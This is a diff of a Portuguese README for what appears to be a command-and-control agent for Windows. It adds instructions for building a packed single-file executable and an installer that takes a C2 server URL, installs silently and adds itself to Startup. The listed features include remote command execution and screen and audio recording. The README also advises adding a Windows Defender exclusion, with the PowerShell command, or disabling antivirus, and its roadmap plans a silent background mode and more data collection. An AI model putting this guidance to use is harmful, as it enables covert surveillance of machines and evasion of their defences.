@@ -203,17 +203,131 @@ dotnet restore
 dotnet build
 ```
 
-## 📦 Distribuição
+## 📦 Distribuição & Release Build
 
-### Criar executável standalone (recomendado):
+### Método 1: Build Automatizado (Recomendado)
+
+Use o script automatizado de build:
+
 ```bash
-dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true
+# No diretório c2-agent/
+build-release.bat
 ```
 
-Vantagens:
-- Não requer .NET instalado na máquina alvo
-- Arquivo único
-- Tamanho reduzido (com trimming)
+Este script:
+- Limpa builds anteriores
+- Compila em modo Release com otimizações
+- Cria executável single-file otimizado
+- Copia para `releases/C2Agent-v1.0.0.exe`
+- Exibe tamanho e localização do arquivo
+
+**Output:** `releases/C2Agent-v1.0.0.exe` (~70-100 MB)
+
+### Método 2: Build Manual
+
+```bash
+cd Agent
+dotnet publish -c Release -r win-x64
+```
+
+O executável estará em: `Agent/bin/Release/net10.0/win-x64/publish/Agent.exe`
+
+**Otimizações incluídas no Release:**
+- ✅ PublishSingleFile (arquivo único)
+- ✅ PublishTrimmed (remove código não usado)
+- ✅ EnableCompressionInSingleFile (compressão interna)
+- ✅ Self-contained (inclui runtime .NET)
+- ✅ Sem símbolos de debug
+- ✅ TieredCompilation otimizada
+
+### Método 3: Criar Installer (Profissional)
+
+#### Pré-requisitos:
+- Instale [Inno Setup 6.x](https://jrsoftware.org/isdl.php) (gratuito)
+
+#### Passos:
+
+1. **Build Release:**
+   ```bash
+   build-release.bat
+   ```
+
+2. **Criar ícone (opcional):**
+   ```bash
+   # Coloque um arquivo icon.ico em c2-agent/Agent/
+   # Você pode criar em: https://favicon.io/ ou https://convertio.co/
+   ```
+
+3. **Compilar installer:**
+   ```bash
+   # Abra Inno Setup
+   # File → Open → Selecione installer.iss
+   # Build → Compile
+   ```
+
+   Ou via linha de comando:
+   ```bash
+   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" installer.iss
+   ```
+
+**Output:** `releases/C2AgentSetup-v1.0.0.exe`
+
+#### Recursos do Installer:
+
+✅ Interface gráfica profissional
+✅ Configuração de URL do servidor C2 durante instalação
+✅ Opção de adicionar ao Startup do Windows
+✅ Criação de atalhos (Desktop e Start Menu)
+✅ Uninstaller incluso
+✅ Suporte para instalação silenciosa (`/SILENT` ou `/VERYSILENT`)
+✅ Bilíngue (Inglês e Português)
+
+#### Instalação Silenciosa:
+
+```bash
+# Instalação silenciosa com parâmetros
+C2AgentSetup-v1.0.0.exe /VERYSILENT /NORESTART /DIR="C:\CustomPath" /TASKS="startup"
+```
+
+### Vantagens da Build Release
+
+- 📦 Não requer .NET instalado na máquina alvo
+- 🎯 Arquivo único, fácil de distribuir
+- 🗜️ Tamanho reduzido com trimming (~30% menor)
+- ⚡ Performance otimizada
+- 🔒 Sem símbolos de debug
+- 📋 Metadados de versão incluídos
+
+### ⚠️ Nota sobre Antivírus
+
+**Importante:** Este tipo de aplicação pode ser detectado como potencialmente indesejado por antivírus devido a:
+- Conexão remota persistente
+- Execução de comandos do sistema
+- Gravação de tela e áudio
+- Single-file executable grande
+
+**Mitigações:**
+- 🛡️ Code signing certificate (reduz falsos positivos, mas é caro)
+- 📝 Adicione exceção no Windows Defender antes de executar
+- 💡 Para ambientes controlados/teste, desabilite antivírus temporariamente
+- ✅ Use apenas em sistemas que você possui ou tem permissão
+
+**Adicionar exceção no Windows Defender:**
+```powershell
+# Execute como Administrador
+Add-MpPreference -ExclusionPath "C:\Program Files\C2Agent"
+```
+
+### 🔮 Roadmap / Futuras Melhorias
+
+**v2.0 (Planejado):**
+- 🪟 System Tray mode (background silencioso)
+- 🔄 Auto-update mechanism
+- 🔐 Autenticação e criptografia
+- 📊 Mais funcionalidades de coleta de dados
+- 🎯 Whitelist de comandos permitidos
+
+O projeto já está preparado para dual-mode (console/tray) via `CONSOLE_MODE` define.
 
 ## 🔗 Componentes Relacionados
 
